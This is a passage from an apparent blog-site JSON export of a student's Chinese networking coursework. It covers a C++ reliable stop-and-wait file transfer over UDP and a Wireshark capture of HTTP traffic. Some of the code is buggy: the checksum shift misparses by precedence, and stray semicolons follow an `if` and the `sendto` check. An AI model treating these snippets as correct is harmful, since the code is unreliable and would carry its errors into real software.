cin &gt;&gt; s; cout &lt;&lt; \"请输入客户端IP: \"; cin &gt;&gt; c; addrop.sin_addr.s_addr = inet_addr(s); addr.sin_addr.s_addr = inet_addr(c);&#125; message类初始化 message::message() &#123; memset(this, 0, sizeof(message));//初始化全0 SendPort = SPORT;//这里以server端为例 RecvPort = CPORT; SendIP = addr.sin_addr.s_addr; RecvIP = addrop.sin_addr.s_addr;&#125; 标志位的获取与设置int message::get_syn()&#123; if (this-&gt;flag &amp; 0x02)//flag的右第二位是0还是1 return 1; else return 0;&#125; void message::set_syn()&#123; if (get_syn() == 0) flag += 0x02;&#125; 消息处理流程server//server端clockstart = clock();//设置timerwhile (1)&#123; while (1) &#123; int flag = 0; simplerecv(msgrecv[recvnextseq]);//接收消息，填入收消息缓冲区 if (msgrecv[recvnextseq].get_exist())//收到消息且顺序正确 &#123; if (msgrecv[recvnextseq].msgseq == recvnextseq&amp;&amp;msgrecv[recvnextseq].checkchecksum())//如果的消息序号正确，校验和正确 &#123;//回复对该消息的ACK确认 message b; b.set_ack(); b.ackseq = recvnextseq; simplesend(b);//发送消息b clockstart = clock();//重启计时器 if (status &amp;&amp; msgrecv[recvnextseq].get_fin()) &#123; status = 0;//断开连接，状态转换 cout &lt;&lt; \"断开连接\" &lt;&lt; endl; memset(msgrecv, 0, sizeof(msgrecv));//重置缓冲区 recvnextseq = 0;//重置 filestatus = 0; fileseq = 0; break;//可以断开连接 &#125; else &#123; if (msgrecv[recvnextseq].get_syn())//建立连接请求 &#123; if (!buildconnectionSer()) return 0;//建立连接失败 else status = 1; &#125; else if (status &amp;&amp; msgrecv[recvnextseq].get_startfile()) &#123; cout &lt;&lt; \"接收文件\" &lt;&lt; endl; //接收文件基本信息 memset(name, 0, sizeof(name)); filestatus = 1;//接收文件状态 index = msgrecv[recvnextseq].index; length = msgrecv[recvnextseq].filelength; strcpy(name, msgrecv[recvnextseq].msg);//文件名 &#125; else if (status &amp;&amp; filestatus &amp;&amp; msgrecv[recvnextseq].get_endfile())//文件发送结束 &#123; filestatus = 0; if (fileseq != index)//核对接收到的文件消息条数和基本信息是否一致 &#123; cout &lt;&lt; \"出错\" &lt;&lt; endl; return 0; &#125; filepacket* packet = new filepacket; packet-&gt;a = msgrecv[recvnextseq]; packet-&gt;index = index; packet-&gt;length = length; //这里为了不让写入内存过程影响消息收发，采用多线程 //多线程函数只能传入一个参数，多余一个的需要打包成结构体 hThread1 = ::CreateThread(NULL, NULL, filehandler, LPVOID(packet), 0, &amp;dwThreadId1); fileseq++; fileseq = 0; cout &lt;&lt; \"文件接收结束\" &lt;&lt; endl; &#125; else if (status &amp;&amp; filestatus) &#123; fileseq++; filepacket* packet = new filepacket; packet-&gt;a = msgrecv[recvnextseq]; packet-&gt;index = fileseq - 1;//文件消息序号 packet-&gt;length = 1024; hThread1 = ::CreateThread(NULL, NULL, filehandler, LPVOID(packet), 0, &amp;dwThreadId1); &#125; &#125; recvnextseq++;//正确处理当前消息，下面可以处理下一条消息了 &#125; else//消息乱序或校验和失败 &#123; if (flag % 3 == 0)//防止发送过多重复信息 &#123; message a; a.set_ack(); a.ackseq = recvnextseq - 1;//返回对最近的确认消息的ACK simplesend(a); &#125; flag++; &#125; &#125; else//没有收到消息 &#123; clockend = clock();//计时 if (status &amp;&amp; (clockend - clockstart) / CLOCKS_PER_SEC &gt;= WAIT_TIME*SENT_TIMES &amp;&amp; recvnextseq)//需要接收到消息且超时 &#123; status=0; break;//做断网处理 &#125; &#125; &#125; WaitForSingleObject(hThread1, INFINITE);//等待当前所有进程执行完毕 outfile(name, content, length, index);//文件写入 int op; cout &lt;&lt; \"接收文件1，退出0\" &lt;&lt; endl; cin &gt;&gt; op; if (op == 0) break;&#125; clientwhile (1)&#123; int op; cout &lt;&lt; \"传输文件1，退出0 \"; cin &gt;&gt; op; if (op == 0) break; char name[30]; cout &lt;&lt; \"请输入文件名 \"; cin &gt;&gt; name; //将要发送的消息添加到缓冲区中 buildconnectionCli(); sendfile(name); byecli(); clock_t timestart = clock();//开始计时 if (base &lt; buffersize);//还有消息未发送或者未确认 &#123;//收线程和发线程 hThread2 = ::CreateThread(NULL, NULL, sendhandler, LPVOID(i), 0, &amp;dwThreadId2); hThread1 = ::CreateThread(NULL, NULL, recvhandler, LPVOID(i), 0, &amp;dwThreadId1); //等待线程执行完毕 WaitForSingleObject(hThread1,INFINITE); WaitForSingleObject(hThread2, INFINITE); if (base == buffersize) &#123; cout &lt;&lt; \"文件发送结束\" &lt;&lt; endl; &#125; &#125; clock_t timeend = clock(); double endtime = (double)(timeend - timestart) / CLOCKS_PER_SEC; cout &lt;&lt; \"Total time:\" &lt;&lt; endtime &lt;&lt; endl; //s为单位 cout &lt;&lt; \"吞吐率：\" &lt;&lt; (double)(buffersize) * sizeof(message)/endtime * 8 / 1024 / 1024 &lt;&lt; \"Mbps\" &lt;&lt; endl; //重置，防止影响下一次发送消息 memset(name, 0, sizeof(name)); buffersize = 0; base = 0; sendnextseq = 0; memset(msgsend, 0, sizeof(msgsend));&#125;","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"socket","slug":"socket","permalink":"https://gitee.com/michelle19l/michelle19l/tags/socket/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"计算机网络作业3-1 基于UDP服务设计可靠传输协议并编程实现","slug":"大三上/计网/计网作业3-1","date":"2021-01-15T04:00:02.000Z","updated":"2021-01-15T06:49:23.805Z","comments":true,"path":"2021/01/15/大三上/计网/计网作业3-1/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A3-1/","excerpt":"","text":"实验3：基于UDP服务设计可靠传输协议并编程实现实验内容：任务3-1：利用数据报套接字在用户空间实现面向连接的可靠数据传输，功能包括：建立连接、差错检测、确认重传。流量控制采用停等机制，完成给定测试文件的传输。 报文格式 #pragma pack(1)//以下内容按1Byte对齐，如果没有这条指令会以4Byte对齐，例如u_short类型会用2B存信息，2B补零，方便后续转换成char*格式struct message//报文格式&#123; //ACK=0x01, SYN=0x02, FIN=0x04,EXIST 0x10,startfile 0x20,endfile 0x40 int flag;//标志位 DWORD SendIP, RecvIP;//发送端IP和接收端IP u_short SendPort, RecvPort;//发送端端口和接收端端口 int msgseq;//消息序号 int ackseq;//恢复ack时确认对方的消息的序号 int index;//用于描述文件大小，需要多少条消息才能传输完成（1条index=0,2条index=1，以此类推） int filelength;//本次实验使用固定报文长度，故只需要告诉对方有多少条和最后一条除首部信息外有多少位有效信息 int fill;//补零成为16bit的倍数，便于计算校验和 u_short checksum;//校验和 char msg[BUF_SIZE];//报文的具体内容，本次实验简化为固定长度&#125;;#pragma pack()//恢复4Byte编址格式 状态转换图与交互流程 ​ 由于本次实验采用停等机制，即每次client端发送一条消息后，需要等待对方回复==对应==的ACK，才能发送下一条消息，故client端和server端（发送端和接收端）状态转换图类似，这里用一张图说明。这里黑色部分为正常情况，蓝色部分为出现异常时的处理。 下面简要介绍交互大致流程，具体细节将在后面对应部分详述 client端： 初始状态0 建立连接：发送一条带有标识SYN的消息，表示希望建立连接，对方收到后回复对应的ACK，连接建立成功。当收到ACK后进入状态1 发送文件： 消息1，文件开始标识位SF=1，index=发送文件需要的消息条数-1，filelength=最后一条消息msg成员的有效位数。当收到对应的ACK后，进入状态2 。每条消息都是收到上一条对应的ACK后再发送。 发送文件，每条msg的有效长度固定为1024，最后一条EF=1，收到ACK后退回状态1 断开连接：发送一条标识为FIN的消息，对方收到后回复对应的ACK，断开连接成功，退回状态0 client端由于是主动发送的一端，一般情况下不会设计蓝色线条的状态跳转，但是可能会有超过重传次数情况下做出的断网处理 server端： ​ - 初始：状态0 建立连接：收到一条SYN，回复对应的ACK，连接建立成功，进入状态1 发送文件：收到包含SF、index、filelength的消息，开始接收文件，进入状态2。对于每条消息都返回一条ACK 。当收到包含标志位EF的消息，检查index与收到文件消息的条数，若一致，则返回ACK，退回状态1 断开连接：收到包含标识为FIN的消息，返回ACK，进入状态0 注：当server端和client端在一定时间内没有接收或不能接收到对方的消息，需要做断网处理，即自动退回到状态0 无异常情况下的发送流程 上图描绘了在正常情况下的发送流程，由于本次采用停等机制，client端每次发送消息后，都要接收到对方回复的对应的ACK（即收到ACK消息的ackseq=发出消息的msgseq）才能发能发送下一条指令 建立连接正常情况下的连接建立过程： ​ 客户端发送带有标识SYN的消息x，接收到对方对消息x的确认消息ACK。由于只是单项传输，所以两次握手即可 出现异常情况下的处理过程 ==注意==，为了处理server返回ACK丢包导致的两端状态不同步和其它异常情况，server端的三个状态均可以接收SYN请求，也均可以接收FIN断开请求 消息①：ACK丢包，client端超过一段时间没收到ACK后重新发送SYN 消息②：部分信息丢失或被篡改，即校验和出错，server端不返回ACK，client端检测到没有在规定时间接收到ACK后重新发送消息 消息③：server端虽然返回了ACK，但由于某些原因client端没有在规定时间内接收到ACK，client端仍需要重传 消息④：client端发出消息④后，在超时时限内收到了两条ACK，且ackseq相同，由于这两条ACK是对仅仅是由重传造成的相同消息的确认，故具有相同效力，取较早收到的ACK即可 int buildconnectionCli()//客户端，连接发起方&#123; message a, b; a.set_syn();//SYN=1 a.msgseq = sendseq++;//设置发送序号 if (stopwaitsend(a, b))return 1; //stopwait函数功能为发送消息a，发生超时事件重传，如果收到了对应的ACK消息b则返回1，超过重传次数依然没有收到返回0 else return 0;//stopwait函数返回0，即没有收到对方返回的消息&#125; int buildconnectionSer(message t)//服务端建立连接&#123;//message t为收到的带有syn标志位的消息 message a,b; a.set_ack(t);//回复对于消息t的ACK a.msgseq = sendseq++;//设置消息a的发送序号，这里的设置只是为了程序的统一性，由于只是单向传输，client端只需检查server端发送的ackseq字段不需要检查msgseq字段，所以不会用到 simplesend(a);//发送消息a cout &lt;&lt; \"连接成功\"&lt;&lt;endl; return 1;//server端接收到syn消息就代表对于server端连接已经建立&#125; 连接断开这里与连接建立类似，由于是单向传输，只需要两次挥手即可，程序逻辑与连接建立类似，client端发送含有FIN的消息，server端收到后回复对应的ACK，连接断开 差错重传使用校验和方式检测是否出现差错，校验和计算方式与rdt3.0类似，只是根据本次实验设计的报文格式进行了简单修改。校验和计算包括0-255bit。 计算方法如下 void message::setchecksum()//发送方计算校验和并填入响应位置&#123; int sum = 0; u_char* temp = (u_char*)this;//以1B为单位进行处理，注意设置为unsigned类型，否则在后续相加时会按照默认最高位是正负号，影响计算结果 for (int i = 0; i &lt; 16; i++)//取报文的前16组，每组16bit，共计32字节256bit &#123; sum += temp[2 * i] &lt;&lt; 8 + temp[2 * i + 1]; while (sum &gt;= 0x10000) &#123;//溢出 int t = sum &gt;&gt; 16;//将最高位回滚添加至最低位 sum += t; &#125; &#125; this-&gt;checksum = ~(u_short)sum;//按位取反，方便校验计算&#125; bool message::checkchecksum()//接收方对校验和进行检验&#123; int sum = 0; u_char* temp = (u_char*)this; for (int i = 0; i &lt; 16; i++) &#123; sum += temp[2 * i] &lt;&lt; 8 + temp[2 * i + 1]; while (sum &gt;= 0x10000) &#123;//溢出 int t = sum &gt;&gt; 16;//计算方法与设置校验和相同 sum += t; &#125; &#125; //把计算出来的校验和和报文中该字段的值相加，如果等于0xffff，则校验成功 if (checksum + (u_short)sum == 65535) return true; return false;&#125; 根据rdt3.0，当server端检测到校验和错误时，不发送NAK，也不返回ACK，只是等待client端超时重新发送。 确认重传前面在连接建立部分已经简要进行介绍，当client端无法在规定时间内接收到相应消息的ACK时，重传消息 主要涉及以下几种情况 server端检测校验和出错，不发送ACK server端发送的ACK丢包 server端发送的ACK未在超时时限内收到 注：这里的recv函数非阻塞 bool stopwaitsend(message&amp; a, message b)//a写入待发送消息，如果收到对方返回的ack则成功&#123; simplesend(a);//发送消息a clockstart = clock();//timer int flag = 0;//重发超过10次退出 while (1) &#123;//这里的recv函数非阻塞 simplerecv(b);//接收对方发送的消息b if (b.get_ack()&amp;&amp;b.ackseq==a.msgseq)//b包含对消息a的ack &#123;//已收到对于消息a的确认，返回1 return 1; &#125; clockend = clock(); if (flag == SENT_TIMES)//重发10次依然失败 return 0; if ((clockend - clockstart) / CLOCKS_PER_SEC &gt;= WAIT_TIME)//超时 &#123; flag++; clockstart = clock();//重置计时器 cout &lt;&lt; \"重传\" &lt;&lt; flag &lt;&lt; endl; simplesend(a);//重传 &#125; &#125; return 0;//0代表发送失败&#125; 停等机制该机制下client端每发送一条消息，都需要等待接收到对方返回的ACK才能发送下一条，client端代码即解释见确认重传部分，这里对server端代码进行解释，即收到client端的消息且检测校验和正确后，向对方发送相应消息的ACK bool stopwaitrecv(message&amp; a, message b)//收到的消息写入a中&#123; int flag = 0; while (1) &#123; simplerecv(a);//收到对方发来的消息a if (a.get_exist())//因为将recv函数设成了非阻塞，所以需要检测收到的消息是否为空 &#123; int check = a.checkchecksum();//检测校验和 if (a.checkchecksum())//检测成功 &#123; b.set_ack(a);//回复对于收到消息a的ack消息b b.msgseq = sendseq++; simplesend(b); memset((char*)&amp;b, 0, sizeof(message));//防止干扰下一次消息接收 return 1; &#125; &#125; &#125; cout &lt;&lt; \"接收失败\" &lt;&lt; endl; return 0;&#125; 给定测试文件的传输client端： 读入文件至内存中 文件起始消息SF置1，将发送文件所需要的消息条数index和最后一条消息msg段有效位数填入报头中index和filelength相应位置，msg成员填入文件名 将内存中的消息复制到message类对象的msg段，逐条发送 最后一条消息EF置1，告知对方文件发送结束 //读入文件void readfile(char* name,char content[10000][1024],int &amp;length, int &amp; index)&#123; index = 0; length = 0; ifstream in(name, ifstream::binary);//以二进制方式读入文件 if (!in) &#123; cout &lt;&lt; \"文件无效\" &lt;&lt; endl; return; &#125; char t = in.get(); while (in)//如果读入失败（读入完成）则退出 &#123;//将文件内容存入content数组中 content[index][length % 1024] = t;//每行1024个字节，对应msg成员长度为1024 length++; if (length % 1024 == 0)//上一条缓冲区 &#123; index++; length = 0; &#125; t = in.get(); &#125; in.close();&#125; int sendfile(char* name)//发送文件&#123; cout &lt;&lt; \"开始发送文件\" &lt;&lt; endl; int length = 0; int index = 0; readfile( name,content,length,index);//读入文件 clock_t timestart = clock();//timer //组装文件开始消息 message a; a.index = index; a.filelength = length; int t = strlen(name); for (int i = 0; i &lt; t; i++) a.msg[i]=name[i];//msg已经初始化全部为0 a.set_startfile();//SF=1 message b; a.msgseq = sendseq++; if (!stopwaitsend(a, b))//发送消息a，等待接收ACK，该函数包括超时重传等功能 &#123; cout &lt;&lt; \"文件传输失败\" &lt;&lt; endl; return 0; &#125; for (int i = 0; i &lt;= index; i++) &#123; message temp; if (i == index) &#123; temp.set_endfile(); //注意文件内容中会有'\\0',不可以使用strcpy for (int j = 0; j &lt; length; j++) temp.msg[j] = content[i][j]; &#125; else &#123;//消息固定长度为1024 for (int j = 0; j &lt; 1024; j++) temp.msg[j] = content[i][j]; &#125; temp.msgseq = sendseq++;//设置消息序号 if (stopwaitsend(temp,b)== 0) &#123; cout &lt;&lt; \"文件发送失败\" &lt;&lt; endl; return 0; &#125; &#125; //吞吐率计算 clock_t timeend = clock(); double endtime = (double)(timeend - timestart) / CLOCKS_PER_SEC; cout &lt;&lt; \"Total time:\" &lt;&lt; endtime &lt;&lt; endl; //s为单位 cout &lt;&lt; \"吞吐率：\" &lt;&lt; (double)(index + 1) * sizeof(message) * 8/endtime /1024/1024&lt;&lt; \"Mbps\" &lt;&lt; endl; cout &lt;&lt; \"文件发送成功\" &lt;&lt; endl; return 1;//发送成功&#125; server端： 接收到包含SF=1的消息，读出index、filelength和文件名，返回ACK 循环接收对方发来的消息，将msg段复制到内存中，逐条返回ACK 当收到的消息包含标识为EF时，表示该条消息msg段有效位数为filelength，将其复制到内存中。校验index与收到文件消息的条数，如果正确返回ACK 将内存中的数据写入文件 int recvfile(message a)&#123;//a为包含SF的消息 message t; t.set_ack(a);//回复对于该消息的确认 a.msgseq = sendseq++; simplesend(t); //获取文件基本信息 int index = a.index; int length = a.filelength; char name[30]; memset(name, 0, 30); for (int i = 0; a.msg[i]; i++) name[i] = a.msg[i]; for (int i = 0; i &lt;= index; i++) &#123; message b, c; memset(content[i], 0, 1024); //将收到的消息复制到内存中 if (stopwaitrecv(b, c)) &#123; if (i == index) &#123; for (int j = 0; j &lt; length; j++) content[i][j] = b.msg[j]; &#125; else &#123; for (int j = 0; j &lt; 1024; j++) content[i][j] = b.msg[j]; &#125; &#125; else &#123; cout &lt;&lt; \"出错0\" &lt;&lt; endl; return 0; &#125; if (i == index) &#123;//消息条数校验 if(!b.get_endfile()) &#123; cout &lt;&lt; \"出错1\" &lt;&lt; endl; return 0; &#125; &#125; &#125; //将content中存储的内容输出到文件名为name的文件中 outfile(name, content, length, index); cout &lt;&lt;name&lt;&lt; \" 文件接收成功\" &lt;&lt; endl; return 1;&#125; void outfile(char* name, char content[50000][1024], int length, int&amp; index)&#123; ofstream fout(name, ofstream::binary);//以二进制方式写入文件 for (int i = 0; i &lt; index; i++) &#123; for (int j = 0; j &lt; FILE_PACKET_LENGTH; j++) fout &lt;&lt; content[i][j];//以字节为单位进行写入 &#125; for (int j = 0; j &lt; length; j++) fout &lt;&lt; content[index][j]; fout.close();&#125; 附录程序执行界面展示 socket的创建头文件 #include &lt;WinSock2.h&gt;//windows socket 编程头文件#pragma comment(lib,\"ws2_32.lib\")//链接ws2_32.lib库文件到此项目中 //加载socket库WSADATA wsaData;//MAKEWORD(2.2),成功返回0if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0)&#123; cout &lt;&lt; \"socket初始化失败\" &lt;&lt; endl; return 0;&#125;//创建Socket//创建一个socket，并将该socket绑定到一个特定的传输层sock = socket(AF_INET, SOCK_DGRAM, 0);//地址类型（ipv4）,数据报套接字if (sock == INVALID_SOCKET)&#123; cout &lt;&lt; \"socket创建失败\"; return -1;&#125;//设置recv函数为非阻塞struct timeval timeout;timeout.tv_sec = 1;//秒timeout.tv_usec = 0;//微秒if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&amp;timeout, sizeof(timeout)) == -1) &#123; cout &lt;&lt; \"setsockopt failed:\";&#125;cout &lt;&lt; \"server3-1\" &lt;&lt; endl;//初始化地址,代码支持输入IP，这里只演示了使用默认IP的情况addrop.sin_addr.s_addr = inet_addr(\"192.168.89.1\");addrop.sin_family = AF_INET;//IPv4addrop.sin_port = htons(SPORT);//端口，30000addr.sin_addr.s_addr = inet_addr(\"192.168.89.1\");addr.sin_family = AF_INET;addr.sin_port = htons(CPORT);//6666//绑定//强制类型转换，SOCKADDR_IN方便赋值 SOCKADDR方便传输//server端需要bind而client端不需要if (bind(sock, (SOCKADDR*)&amp;addrop, sizeof(SOCKADDR)) == -1)&#123; cout &lt;&lt; \"bind error\" &lt;&lt; endl; return -1;&#125;......//程序执行，消息收发closesocket(sock);//关闭socketWSACleanup();return 0; 消息的发送与接收 为了简化后续代码，将send和recv简化封装成函数 注意这里由于使用的是UDP，每次发送和接收都需要指明目的或者来源IP地址 void simplesend(message&amp; a)&#123; a.set_exist();//表示该条消息存在，方便非阻塞式recv判断是否接收到了消息 a.setchecksum();//设置校验和 //用sock发送a中的内容，注意第二个参数是char*，所以需要强制类型转换 //第三个参数为发送缓冲区长度，注意不能设置过长，否则会造成缓冲区溢出 //第四个代表相关操作，一般设置为0 //第五个是目的IP地址，即向哪个IP发送消息 //第六个是addr的长度 if (sendto(sock, (char*)&amp;a, sizeof(message), 0, (struct sockaddr*)&amp;addr, sizeof(sockaddr)) == SOCKET_ERROR);//如果发送失败，这里由于后续有确认重传机制，不在发送函数中进行处理 &#123; &#125; //打印每条发送报文标志位相关信息，方便观察传输过程，由于IO时间消耗很大，这里注释掉 //if (a.flag) &#123; cout &lt;&lt; \"发送 \"; a.print(); &#125;&#125;void simplerecv(message&amp; a)&#123; memset(a.msg, 0, sizeof(a.msg));//初始化全为0，防止收到前面收到消息的影响 //参数与sendto函数类似，只是第五项的目的IP地址改为源IP地址，即从哪个IP接收消息 recvfrom(sock, (char*)&amp;a, sizeof(message), 0, (struct sockaddr*)&amp;addr, &amp;addr_len); //if (a.flag) &#123; cout &lt;&lt; \"接收 \"; a.print(); &#125;&#125; 支持用户输入IP //这里仅以一端作为演示cout &lt;&lt; \"是否使用默认IP？是1，否2 \";int i;cin &gt;&gt; i;if (i == 2)&#123; char s[20] = &#123;&#125;; char c[20] = &#123;&#125;; cout &lt;&lt; \"请输入服务器IP: \" ; cin &gt;&gt; s; cout &lt;&lt; \"请输入客户端IP: \"; cin &gt;&gt; c; addrop.sin_addr.s_addr = inet_addr(s); addr.sin_addr.s_addr = inet_addr(c);&#125; message类初始化 message::message() &#123; memset(this, 0, sizeof(message));//初始化全0 SendPort = SPORT;//这里以server端为例 RecvPort = CPORT; SendIP = addr.sin_addr.s_addr; RecvIP = addrop.sin_addr.s_addr;&#125; 标志位的获取与设置int message::get_syn()&#123; if (this-&gt;flag &amp; 0x02)//flag的右第二位是0还是1 return 1; else return 0;&#125; void message::set_ack(message b)//ack需要指明是对哪条消息的确认&#123; if (get_ack() == 0) flag += 0x01;//一个标识位只需要1bit this-&gt;ackseq = b.msgseq;&#125; void message::set_syn()&#123; if (get_syn() == 0) flag += 0x02;&#125; 消息处理流程server：while (1)&#123; message b; simplerecv(b); if (b.get_exist()) &#123; if(!tackle(b))break;//对收到的消息b进行处理，当server端选择退出时时返回0 &#125; Sleep(20);//防止频繁接收空消息占用大量CPU资源&#125; int tackle(message b)//处理收到的报文&#123; if (b.get_syn())//如果b中包含syn，则执行建立连接相关部分 &#123; if (buildconnectionSer(b)) &#123; status = 1;//设置状态 cout &lt;&lt; \"建立连接\" &lt;&lt; endl; &#125; else cout &lt;&lt; \"连接建立失败\" &lt;&lt; endl; &#125; else if (b.get_startfile()) &#123; if (status) &#123; cout &lt;&lt; \"开始接收文件\" &lt;&lt; endl; recvfile(b); &#125; else cout &lt;&lt; \"请先建立连接\" &lt;&lt; endl; &#125; if (b.get_fin())//如果client请求断开连接 &#123;//这里可能出现双方状态不一致的情况，所以server端支持所有状态下的断开连接请求 if (byeser(b)) &#123; status = 0; sendseq = 0;//发送序号重置 &#125; else cout &lt;&lt; \"未连接\" &lt;&lt; endl; cout &lt;&lt; \"对方已经断开连接，是否结束程序？0退出，1不退出 \"; int i; cin &gt;&gt; i; if (i == 0) return 0; &#125; return 1;&#125; clientwhile (1)&#123; int op; cout &lt;&lt; \"请选择操作：传输文件1，退出0 \" &lt;&lt; endl;//用户进行操作选择 cin &gt;&gt; op; if (op == 0) break; else if (op != 1) cout &lt;&lt; \"无效操作\" &lt;&lt; endl; else if (op == 1) &#123;//选择发送文件 cout &lt;&lt; \"请输入文件名 \" &lt;&lt; endl; char name[30] = &#123;&#125;; cin &gt;&gt; name; //建立连接，发送文件，断开连接 if (buildconnectionCli()) &#123; if (sendfile(name)) &#123; cout &lt;&lt; \"文件发送成功\" &lt;&lt; endl; &#125; else cout &lt;&lt; \"文件发送失败\" &lt;&lt; endl; &#125; else cout &lt;&lt; \"连接建立失败\" &lt;&lt; endl; if (byecli()) &#123; cout &lt;&lt; \"连接已断开\" &lt;&lt; endl; sendseq = 0;//发送序号置零 &#125; else cout &lt;&lt; \"连接断开失败\" &lt;&lt; endl; &#125; sendseq = 0;//发送序号置零&#125;","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"socket","slug":"socket","permalink":"https://gitee.com/michelle19l/michelle19l/tags/socket/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"计算机网络作业2 Web服务器配置，HTTP报文捕获","slug":"大三上/计网/计网作业2","date":"2021-01-15T04:00:01.000Z","updated":"2021-03-16T05:23:53.441Z","comments":true,"path":"2021/01/15/大三上/计网/计网作业2/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A2/","excerpt":"","text":"计算机网络第二次实验作业——Web服务器配置，HTTP报文捕获实验要求（1）搭建Web服务器（自由选择系统），并制作简单Web页面，包含简单文本信息（至少包含专业、学号、姓名）。 （2）通过浏览器获取自己编写的Web页面，使用Wireshark捕获与Web服务器的交互过程，并进行简单分析说明。 Web服务器的搭建 系统：windows xp 虚拟机 软件：apache（phpnow） 虚拟机IP：192.168.141 端口：默认端口80 访问方式：主机浏览器访问虚拟机ip 安装软件后，在安装路径C:\\phpnow\\htdocs\\下添加页面，本次实验所需的html文件将统一放置在netword子路径下 具体代码内容将在下一部分（数据包捕获）详述 通过Wireshark捕获与Web服务器的交互过程网页访问概览打开Wireshark，选择需要捕获的网卡，这里由于是使用NAT模式下的虚拟机搭建的服务器，所以选用VMnet8 为了观察连接的建立和页面访问的基本过程，使用一个空的文件1.html 访问 可以看到Wireshark捕获到的内容。 界面大致分为四个区：命令菜单区、俘获分组列表区、选定分组首部细节区、十六进制和ASCII格式分组内容区。 其中，命令菜单区的应用显示过滤器部分可以筛选显示的分组，例如可以查找TCP协议下包含80端口的消息；能够找到在source或destination中包含该ip的消息，由于没有使用127.0.0.1，所以查找结果为空 TCP对于第一条消息，为TCP原型 消息分为4个部分 Frame，指的是==物理层的数据帧概况== Ethernet II，第0-13个字节，表示数据层以太网帧头部信息，包含目的地址、源地址和协议类型 源地址为00:50:56:c0:00:08在数据包的第6-11字节表示发送端的物理地址，看到是主机网卡中的信息，源ip信息与源网卡信息相对应，可以看到是主机向“服务器”发送的网络请求 目的地址为00:0c:29:8d:b9:51 在数据包的前六个字节，是虚拟机对应的网卡，表示消息发送至虚拟机网卡 协议类型为IPV4，用0x0800表示 整体格式符合定义 #pragma pack(1)//以1byte方式对齐typedef struct FrameHeader_t &#123;//帧首部 BYTE DesMAC[6];//6字节目的地址 BYTE SrcMAC[6];//6字节源地址 WORD FrameType;//帧类型，解析时注意大小端转换&#125;frameHeader_t; Internet Protocol Version 4，第14-33个字节，互联网层IP包头部信息 对应内容为 typedef struct IPHeader_t &#123;//IP首部 BYTE Ver_HLen; BYTE TOS; WORD TotalLen WORD ID; WORD Flag_Segment BYTE TTL; BYTE Protocol; WORD Checksum;//校验和 ULONG SrcIP;//源ip地址 ULONG DstIP;//目的ip地址&#125;IPHeader_t; 例如源IP地址为192.168.89.1，以十六进制显示在消息中为c0.a8.59.01 Transmission Control Protocol，第34个字节开始，传输层的数据段头部信息 可以看到，消息是由主机的3164端口发送至虚拟机的80端口 HTTP选取一条HTTP消息 消息格式为在原有TCP格式的基础上，增加超文本传输协议部分 可以看到十六进制的消息和对应的字符 连接的建立与断开 找到IP对应的mac地址 broadcast为设置目的地址为全1（十六进制下的全f），类型为ARP，用0x0806表示 目的地址全零表示未知地址 主机向虚拟机回复ip地址对应的MAC 三次握手 由第7条消息可以看到，采用的是HTTP/1.1，使用双端口进行连接，防止头阻塞 对于每个端口，由主机向服务器发送连接建立请求SYN，服务器向主机回复SYN消息并携带确认消息ACK，主机收到服务器的回复并再次向服务器发送ACK 四次挥手 同样，使用双端口，对于每个端口有以下过程 主机向服务器发送连接断开请求，服务器回复确认， 服务器关闭与服务器的连接，并发送FIN和ACK。客户端收到消息，回复确认 获取网页文字信息 网页 &lt;html&gt; &lt;head&gt; &lt;title&gt;Michelle&lt;/title&gt; &lt;h1&gt;1811494 刘旭萌 &lt;/h1&gt; &lt;/head&gt; &lt;body&gt; 信息安全专业 &lt;/body&gt;&lt;/html&gt; 使用过滤器进行查找 在这个区找到我们写的html内容，可以看到我们的文件一共由九行，与上述代码相对应 中文由\\xxx八进制编码显示，在字符区由16进制表示，例如使用URL解码工具 获取图片信息&lt;html&gt; &lt;head&gt; &lt;title&gt;Michelle&lt;/title&gt; &lt;h1&gt;1811494 刘旭萌 &lt;/h1&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=/1.jpg&gt; &lt;/body&gt;&lt;/html&gt; 利用GET请求图片文件， 返回状态码200代表请求成功，同时返回图片内容（43号消息） 与图片的16进制编码进行比对，证明是图片内容 获取视频信息&lt;body&gt; &lt;video width=\"300\"height=\"240\"controls=\"controls\"&gt; &lt;source src=\"video.mp4\",type=\"video/mp4\"/&gt; &lt;/video&gt; &lt;/body&gt;&lt;/body&gt;&lt;/html&gt; 捕捉到一系列数据包 TCP包中的win代表接收窗口的大小，即表示这个包的发送方当前还有多少缓存区可以接收数据 TS(Timestamps) Timestamps在tcp选项中包括两个32位的timestamp: TSval(Timestamp value)和TSecr(Timestamp Echo 